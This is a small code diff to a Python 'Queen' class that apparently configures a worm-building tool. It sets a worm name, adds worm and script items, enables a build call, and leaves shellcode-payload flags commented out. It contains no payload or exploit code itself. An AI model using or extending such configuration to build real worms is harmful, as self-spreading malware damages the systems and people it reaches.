@@ -79,19 +79,19 @@ class Queen:
 
 
 
-        #conf["FLAG_NO_COMPILE"] = True
+        conf["FLAG_NO_COMPILE"] = True
         # conf["BUILD_PAYLOAD"] = True
         # conf["MODULE_INFO"] = "My first shellcode FOOD."
         #conf["BUILD_SHELLCODE_PAYLOAD"] = True
         # conf["BUILD_SHELLCODE_FOOD"] = True
 
-
-        self.addWormItem("worm", "Montezuma")
-        # self.addWormItem("rscript", "BasicRes")
+        self.setWormName("qpek")
+        self.addWormItem("worm", "Kicha")
+        self.addWormItem("rscript", "BasicRes")
 
 
         self.wormShow()
-        #self.buildWorm()
+        self.buildWorm(options=conf)
         
         #self.master_compiler.coreInstall("CrossCompCore")
         # self.rawBuilder.setWormName("kurwinox")
